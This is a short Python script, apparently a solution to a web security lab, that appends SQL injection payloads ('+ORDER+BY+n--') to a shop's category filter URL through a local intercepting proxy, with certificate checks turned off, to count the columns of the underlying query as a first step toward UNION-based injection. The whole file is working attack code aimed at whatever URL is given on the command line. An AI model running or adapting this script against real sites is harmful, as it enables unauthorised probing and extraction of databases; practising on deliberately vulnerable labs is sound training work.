import requests
import sys
import urllib3
# This will help us in getting clean output.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Settingup proxy.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# This fuction will give us the number of columns
def sqli_columns_payload(url):
    # This is the path where we will attach.
    path = "filter?category=Gifts"
    # It up to you how far you wanna go "I am going till 50".
    for i in range(1,50):
        # Storing the payload in a varibale for use.  
        sql_payload = "'+ORDER+BY+%s-- " %i 
        r = requests.get(url + path + sql_payload ,verify = False , proxies = proxies)
        res = r.text
        # After storing r file into res we will check if it give error then it will return the i - 1
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False
if __name__ == "__main__" :
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Try to enter valid url or path ")
        sys.exit(-1)

    print("[+] Figuring out number of columns...")
    num_col = sqli_columns_payload(url)

    if num_col:
        # For printing the number of columns we do this.
        print("[+] The number of columns is " + str(num_col) + "." )
    else:
        print("Sqli was unsuccessfull")
